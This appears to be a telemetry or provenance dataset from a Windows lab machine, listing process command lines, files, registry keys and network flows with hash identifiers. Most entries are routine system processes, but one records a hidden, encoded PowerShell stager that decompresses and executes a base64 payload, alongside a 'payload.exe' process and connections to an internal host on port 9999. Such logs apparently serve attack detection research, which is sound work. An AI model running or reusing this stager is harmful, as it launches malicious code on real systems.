11c68c80ab66e43acedd1f1583abfd105b1ea10d1a0c9ef43c301f668ab9bb74,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe 14712960872013529032212180383310137508421618420066-249767920-2123542115-106330918'},470883
d31750b200247f2a170bf0b8a07b1300d42c2c2009e69816b5571e4e203c6757,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k LocalServiceNoNetwork'},469860
017732516056685991472df328a2dff306787651d020db28eaca4623c4ecc760,{'subject': 'c:/windows/explorer.exe C:/Windows/Explorer.EXE'},469861
bc28b78f3af66755cfa7d129efa52ba56d780c43492f38816a3d982b421ec9a3,{'file': 'c:/program files/wireshark/dumpcap.exe'},1895
619a24b16a82e5b909bed145bdd2b59b0f922203581e2aa599a4afa83d04bb2a,"{'subject': 'c:/windows/system32/windowspowershell/v1.0/powershell.exe powershell.exe -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((H4sIAMUL12ICA7VXbY/aR+hD++Xqn/wYqQMAoHNriXu0iRasPxFmxe/HZAUWXstb3H2kvsNRxp+987C/juolzatFIsWax3Z2Znn3lmZ{1}mL1GeYp{1}IeCH/8/JNweaZe5iWCWPGLsF0XKrtsup3WnpcrO6p1hA+CuFJ3uy5NPJyu37/vFFmGUnb+bvQRU/McJRuCUS7WhD8FN0YZuppsHpDPhD+Eyu+NPqEbj1zEjh3Pj5FwpaYBXxtT3+OeNcwdwUys/vZbtba6kteNu0+FR3Kxah+5zhpJGQEi1JvxV4xtaxx0Sqzr2M5rTkDVcnLZ+bDTvNvRAZYG2PdMRiGuRVOMzzcTLEiiw9n4qbOQuJVRhOM+qrQZChPK/WhRXfYLVe/yquLrvPi5ThBDWGKUMZ3Zko22Mf5Y2BlwYEzVG4Bi2TZTiN1rUaiO3pFomVtCCkLvwXM6KBDiV236skvlQCqSnLanWI6ivn1GlQEHTWrL7i6IkJNXie2AAI/sVBDEsGHZetVyj0PFE+q9MKAp/FKc3xSfeDINUFHXb3GM2O8Fmxs{1}LV1k+IC5VACtP691qTS1WuWAQws3IoDtbP+l8QoBJwpX8{1}cxeFOEXdY+ol2C/5Kr4WExQSdMKjUYoZ4J5YvSy{1}oIsIijzGUebU+ErtLsHsSVcrMAlQpvoQ1xy8{1}pDXvnTmHDix+Okx1lA+B252/{1}aiWELEGl9CUzjuXu/BuEqh3i5XldmBaQpn5dMJFHUFAX1DTHlyW1YPQ0rD67qxeEYd/LWWluXfsCzMumHZrmLCt8iCkAYJk75GOPcDzqw{1}AHSDuaOCo3r76KRscjBHIHLO0hGjDDUTAZZ0oGfp5YUWuYiA2THUEJyJyKRo94EZSIS4acqOVFKKi+6maZBmfOc1RKOF44CaE2C+WV1wcEZ{1}wLEEQZm/S8Xvq484EsnQ5e4iGVqrbQj4+SvHMLfHzhBL/ic0M{1}YINHLaKJ5ObpWzjVGfNOc4KkKz2KYEj+0YbbE8PMCrw2t33wUfR5QdP3YHTd3v5NN+70bFh+j{1}3xiqH4wCdG+uC3+MxRWGeqDmZY0pTY1yQLxvaQLYbqwMJStIh9Ik3BhrnIJXwYuLrf1T4fWjnQVFEG95LabiuTtrQF8BZYjrZqYCT48DiGMRTTyV{1}b5po0JHejznzjt+npLlwyaSi8OXZqb14tus9m8Dbz+LyRQNRq0SOE5c2oN/ERrNh09YJY+tG5b9Nv7M+z2m5t9ee+5{1}vzBt5/KBGH3vBbpPM90Fbjywyi3RLLfRuHjl{1}x3iYvRsOopbR2Uaze+2w6Tv3S3c09u5ne8PS2+MHvTXsxGOzNzesziHa9Em2NLXB0jWyzRF0WvFx05LJ+PN+W{1}b0Ko+vLk46i6KZmLdxl7CfbJztqP7p20iRt3jqW3aJd8Jm+PYLDE3zD/R63Y2O5lRSzq8mL1o28aM9z/cGYbezlYtEOZr4pO5PeaLuxRpb90Btb/eXE+dOPHheurdj++x8tmv3nrjh6JQdXumMY9wEQOLCd5yBxTeQdrrhftQm+oAk6dkdKnd3afhk4Sy/Pddf/kF+DoJBHT4pjL9w4D2/aGkaUC7vOpKivTpmO1743rOx881j7N+pF6ByMP3pmqWV4Pb+239015CXsraeq0InUIa7a8pHc7b6Ts+mw7nz2clH6j+BOzfE1c3wuv+nsd476fzY9C/KzaJI6nj/YF5I/BZs5q39oc3kAQrG6es3VpX9qNP2+Yw3iZ9/qhD/RSZ8qwXqXpb+HHoEM{1}d5WFqke+zXqXZjWlmGuIIlx7tihLEYF7A+twkyuxWCaE+75W8qUGbPjdP3svt4cml10Y14Umw9txCy6n375f{1}ItQLnsyNM+UojFtelx7YkQeuTHiXlVBi+/2AdujuKJ2N13jwBl9I2OdkGcz{1}URPFHQwU3JAbF+pt{1}fQs32H{1}LxRVq/bnmcfQ+0SslL7E6HemLBS+AAMRlOveJXozM9wMAV+iRUGL84vLyIVI5q9iMpcyncMfwE/0KZ57l/WP0uGkl1js1Xk19OvOh2P+z0rocZyJnQfA{1}634VeBeGSIi9iC2EB/oeXh/9BmBTsyoAL56n9/Q2hf1fym{1}wAAA{0}{0})-f=,g)))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))'}",470888
8bb342e7a1cda2c4065ce7f27e1812b362bb3d686df5fa106acc72f24889fe5f,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe 1666846486-779156655-774406944-3116519025536314-10197683971052088329-277897143'},470889
493449387981f542ae99e39f97088186bf62efe820e30bde2fafe79360875fb4,{'file': 'c:/program files/wireshark/tshark.exe'},1919
0395a7c6e956e481154cfba51b07c801fdb74c38b261b4ef32e622e269a870b9,{'subject': 'c:/windows/system32/audiodg.exe C:/Windows/system32/AUDIODG.EXE 0xc18'},472459
a3bc39197a1a026e21367da78b9d2635ca5cc5511d7b6c768acd4fa10ffa827f,{'subject': 'c:/windows/system32/audiodg.exe C:/Windows/system32/AUDIODG.EXE 0xc18'},472467
36701d8bef3cb5ae5eb35a855e471a939d3bcf75d976e4f7297943ed4aaaebac,{'file': 'c:/windows/system32/mshta.exe'},447383
2fbde5f768353c52a330ff1e27be0c37d02ce85aba0b4fa91f303660fea5fa05,{'netflow': '192.168.223.128:50149->10.193.66.115:8443'},473507
8842911f3bdd65f9fff79175f4e2fdf7f1d01a655bfc9d4ec9b0ddf38b512b46,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k netsvcs'},469923
4cf264d488f7cf35e7454bdca2e19772c578eaf05973bbf04f9e3fd3c3d1343a,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{F9717507-6651-4EDB-BFF7-AE615179BCCF}'},473508
b37ac080e71c1fe650bc5220683d89f0637a86753c991f78dbfaf6605d546a7b,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/System32/svchost.exe -k WerSvcGroup'},469928
a298ea4ac54414cae303113c0a14a71272b5af0067f236f5e7ffefbfec56a076,{'subject': 'c:/program files/confer/repux.exe repux.exe'},473513
f3a362dbe12bad0d306f1ddec8f3b8bf8a893871097c2e7109dbe097606d5b01,{'subject': 'c:/program files/mozilla firefox/firefox.exe C:/Program Files/Mozilla Firefox/firefox.exe -contentproc --channel=3900.5.951001077/391959572 -greomni C:/Program Files/Mozilla Firefox/omni.ja -appomni C:/Program Files/Mozilla Firefox/browser/omni.ja -appdir C:/Program Files/Mozilla Firefox/browser  3900 /./pipe/gecko-crash-server-pipe.3900 tab'},470953
179f92addc05d8b6f81fdec2cb54ad8ce3b97f14eb48e9f55436983f2850b11b,{'subject': 'c:/windows/system32/services.exe C:/Windows/system32/services.exe'},469929
277838b2bdf3d23c98629fc02b41fb3a0c2b7e5de45281760c0c4f658bc12757,{'subject': 'c:/python27/python.exe python  -m SimpleHTTPServer'},470957
08cabf6b077594bf4baf9766a49d2dafcb4e3f7e879af0486706655afbba6144,{'subject': 'c:/windows/system32/cmd.exe C:/Windows/System32/cmd.exe '},470958
dc5e419f596198cacd0140f50cf7377044dbd035756b25caebacf1c12023f5af,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe -1647456713-875421518142973041025147409-1538463883-17554966281843809978-395611313'},470959
f04319755dcf8d05e33d2d6c7a7412848abad97b76839635fc6218cfeda4b453,{'subject': 'c:/program files/wireshark/dumpcap.exe C:/Program Files/Wireshark/dumpcap.exe -n -i /Device/NPF_{DE145F66-537B-427D-820A-707CC694DA57} -f udp port 53 -Z 4660'},470960
59d721f381c754ef3e28774539d4a6905347da47c0c5b329c6c1000be8f7b5fd,{'subject': 'c:/program files/wireshark/tshark.exe C:/Program Files/Wireshark/tshark  -i 2 -t ad -f udp port 53 '},470961
0817ec915f3aeec7f89f81c56323cbcc1883fa3a1241dc6f59f568b654e27e7d,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe 177932576498535421-2113097610153166625491838115-2083859539-6155808142143712326'},470962
6b62666f2d6effe1052b7deebc68e7d2506c7925d05daff1869f2537be16114f,{'subject': 'c:/windows/system32/cmd.exe C:/Windows/system32/cmd.exe /c C:/Users/aalsahee/Desktop/start_dns_logs.bat '},470964
7368fc9d1e74a6d4ed4add864ae5f16a0c084355eb2c4f8b6d65c82bd9e3d458,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe -1107079934-510235374-1756141904188279807918412658731467348259839592866666406460'},470965
2f1e302555d8c8a565bf17d70c838005dd350c17ac5dc0fab3842db97461ec13,{'file': 'c:/windows/system32/windowspowershell/v1.0/powershell.exe'},318390
616df077b14e3e4929c04d5f2d05f96fb271d1d6c56d2d3f0913b40a8356ac47,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/System32/svchost.exe -k swprv'},471481
a8b1ccb871e8dddc3c78ca523e88c5ec92fc4d30e8a76ad5a2237bb747824445,{'file': 'c:/windows/system32/dwm.exe'},124863
4dec786758a4b0107204ef665e9bfcc3f8b1f0acf359b023be9bd174e3ef10e6,{'subject': 'c:/program files/microsoft office/office14/winword.exe C:/Program Files/Microsoft Office/Office14/WINWORD.EXE '},469960
e94411b0ab40904d08aa339e28c0bec184e27acb0f0230ac9f30702e93a1f15c,{'netflow': '192.168.223.128:50103->10.193.66.115:8080'},469961
4ea09ba7a09d60c3d8144379dd21afe651b32651b7a11168089684cec61a168d,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k DcomLaunch'},469962
9f8ac36806665317fa251bf38d3575497d18f7958c6f03cbcf034bfd86eaa556,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{F9717507-6651-4EDB-BFF7-AE615179BCCF}'},469963
382617861ca4f65a7702b0e8db922337b59d9fffe862d76f535f5d2c48c9f824,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k RPCSS'},469964
841a0ed17d9fc1f6e3fcd11487232d0b6a38052635a09019aea31f2e7a004f40,{'subject': 'c:/program files/vmware/vmware tools/vmtoolsd.exe C:/Program Files/VMware/VMware Tools/vmtoolsd.exe -n vmusr'},473550
471292749f1e931e48bdae5af6a984d138e3bca180b2cc45b1b2159887b04426,{'subject': 'c:/program files/vmware/vmware tools/tpautoconnect.exe TPAutoConnect.exe -q -i vmware -a COM1 -F 30'},473551
7dad7e7d8f2e3e02caac619a5d94e57e11b5c26c624e6c6a598275edc15cea46,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe -487645183-1293012984-1168617979-603719737-65541824142213917725269363891621020'},473552
c7c2d16d53d1e2c9a2c573bd98c9e7f3a0f91de7185be49c656df36d1ef69d26,{'subject': 'c:/program files/confer/repux.exe repux.exe'},473553
c35c9aa325e69d48c791dd463a85b484a99c25fa76bb07e68e910f19e2be4269,{'subject': 'c:/program files/microsoft office/office14/winword.exe C:/Program Files/Microsoft Office/Office14/WINWORD.EXE  /Embedding'},469969
3eedc8b87a0e381ef569bc6a88dc95e6a17aab9d5fcf04ce04fc834210649a90,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},471000
d82912b91bd2d7854eeece6c3f6967c1e58f3af78f6ddfb8c63de0705e8d0e80,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},471001
5aeb243c682f8bd6cc4184aa2f0d5f455849748eb1b6c7c20227f926a1d729df,{'subject': 'c:/windows/system32/audiodg.exe C:/Windows/system32/AUDIODG.EXE 0x76c'},471004
8ab27c7399a39e639331aaba11dec411db9d51fc377260454bbe8a908e4b0706,{'subject': 'c:/windows/system32/audiodg.exe C:/Windows/system32/AUDIODG.EXE 0x76c'},471005
d36d5388ed0e870dde4f9de0ddeda2aff2fa9ba9af19383556a421629e7abcbc,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},471007
466f40367068f7cc8bbe659df89d3c1430485f44bda1d372e017359dc217321b,{'subject': 'c:/windows/system32/mmc.exe C:/Windows/system32/mmc.exe C:/Windows/system32/eventvwr.msc /s'},471008
dbdd80ef7817db03e5c54ce02183fe28d527d03bb505c43409477b88d4f45fb1,{'subject': 'c:/windows/system32/consent.exe consent.exe 984 378 02B98B58'},471009
12869b25bc26fb604a47e44d08e416dabdeab915b5cf2136a231428e6633e45b,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}'},471010
911941f76bc572626acae1a14111540be0264a87828e07a2d6f27fff7b0f7549,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}'},471011
229f3fea713873317ecee55c9d8e07410885d0b410c73d8160931ca59e45a9cf,{'subject': 'c:/windows/system32/mmc.exe C:/Windows/system32/mmc.exe C:/Windows/system32/eventvwr.msc /s'},471012
cbcf279a55c7b874e2ee3efc78f6eadfc27e47cf473e22c51ab0763c1b9f3b90,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{F9717507-6651-4EDB-BFF7-AE615179BCCF}'},471013
044ed09df5eb296b145828aa48012d7a69ed2024280a4edca7c05f9a5ca93e80,{'subject': 'c:/program files/microsoft office/office14/winword.exe C:/Program Files/Microsoft Office/Office14/WINWORD.EXE '},471014
d9b7019068fe5bda90c03a4c27aa0efc505d87c0113e0e2be4925825bbb50b9a,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k NetworkService'},471017
fb3ffc5aed9aa2b0b0e78a553da6a7941ccd003759ab9431e4a751b9d43351f7,{'netflow': '192.168.223.128:50090->10.193.66.115:8080'},471018
eb9666ccad765c03dc9660eb9e23ad30bfdaf9245001a0eaf32c550aadefee48,{'subject': 'c:/users/aalsahee/payload.exe payload.exe'},473069
e7e43ab71ebc0452c9e1e8bee643f6c115303fb3d8f264c6f7b05331b6d4f81a,{'netflow': '192.168.223.128:50168->10.193.66.115:9999'},473070
93e4a2ca439c76118b5da5db7684c8662695d13a9c10e8a7da5fc5253eb24c7e,{'subject': 'c:/users/aalsahee/payload.exe payload.exe'},473071
97903dd4ee8e59229e4fe7b0ad6804e63e92e291f8d8e1e3695c8d81ebbde580,"{'file': 'HKU/S-1-5-21-450080267-1945256726-3465656282-1000/Software/Classes/Local Settings/MuiCache/36/52C64B7E/@C:/Windows/system32/WindowsPowerShell/v1.0/powershell.exe,-101'}",468981
a333026b409b9f9238413904705c5799a8594167b58686de6a0f79ed7d516c98,{'subject': 'c:/program files/mozilla firefox/firefox.exe C:/Program Files/Mozilla Firefox/firefox.exe '},473592
3c8b29461a4fffc1b3d7a637b14c80cad38ce0193205eeb38324c316cb38165b,{'subject': 'c:/program files/mozilla firefox/firefox.exe C:/Program Files/Mozilla Firefox/firefox.exe -contentproc --channel=1928.0.1935618673/1508655011 -greomni C:/Program Files/Mozilla Firefox/omni.ja -appomni C:/Program Files/Mozilla Firefox/browser/omni.ja -appdir C:/Program Files/Mozilla Firefox/browser  1928 /./pipe/gecko-crash-server-pipe.1928 tab'},473595
e6cc300fe4dce0f52ba43cd6093c1959330b2e88c837b12209813c6ace6e7043,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/dllhost.exe /Processid:{D2FE8F47-D0BC-443A-B30F-841E8D5063B0}'},473596
